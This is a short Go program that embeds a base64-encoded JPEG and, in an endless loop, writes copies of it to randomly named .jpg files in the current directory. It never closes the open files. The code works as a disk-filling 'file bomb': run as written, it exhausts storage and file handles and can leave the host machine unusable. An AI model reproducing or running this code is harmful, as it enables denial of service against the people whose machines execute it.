package main

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"os"
)

func main() {
	sufferer()
}

func GenerateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}

	return b, nil
}

func GenerateRandomString(s int) (string, error) {
	b, err := GenerateRandomBytes(s)
	return base64.URLEncoding.EncodeToString(b), err
}

func sufferer() {
	counter := 0
	var theman = `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`

	dec, err := base64.StdEncoding.DecodeString(theman)
	if err != nil {
		panic(err)
	}

	for {
		fmt.Println(counter)
		format := ".jpg"
		randstring, err := GenerateRandomString(32)
		fname := randstring + format
		f, err := os.Create(fname)
		if err != nil {
			panic(err)
		}
		defer f.Close()

		if _, err := f.Write(dec); err != nil {
			panic(err)
		}
		defer f.Close()
		if err := f.Sync(); err != nil {
			panic(err)
		}
		counter++
	}
}
